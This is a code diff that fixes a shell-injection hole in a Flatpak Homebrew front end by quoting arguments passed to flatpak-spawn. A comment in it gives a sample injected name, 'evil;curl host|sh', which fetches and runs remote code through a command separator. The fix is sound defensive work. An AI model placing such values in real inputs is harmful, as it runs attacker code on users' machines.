@@ -14,6 +14,7 @@ import gettext
 import io
 import json
 import os
+import shlex
 import struct
 import subprocess
 import threading
@@ -45,10 +46,16 @@ def _brew_cmd(args):
     monkeypatch tavern.backend.IN_FLATPAK / BREW_BIN.
     """
     if IN_FLATPAK:
-        # Use flatpak-spawn to run brew on the host with updates disabled
+        # Use flatpak-spawn to run brew on the host with updates disabled.
+        # Every arg must be shell-quoted: args derive from untrusted input
+        # (tap .rb filenames, Brewfile contents, GitHub tap search results),
+        # and an unquoted name such as ``evil;curl host|sh`` would otherwise
+        # run arbitrary commands on the HOST as this user — the app already
+        # has --filesystem=home and flatpak-spawn --host (tuna-os/Tavern#89).
+        quoted = ' '.join(shlex.quote(str(a)) for a in args)
         return ['flatpak-spawn', '--host', 'bash', '-c',
                 f'export HOMEBREW_NO_AUTO_UPDATE=1 && export HOMEBREW_API_AUTO_UPDATE_SECS=604800 && export HOMEBREW_NO_INSTALL_ASK=1 && '
-                f'eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)" && brew {" ".join(args)}']
+                f'eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)" && brew {quoted}']
     else:
         return [BREW_BIN] + args
 from .package import Package  # noqa: F401  (re-exported)
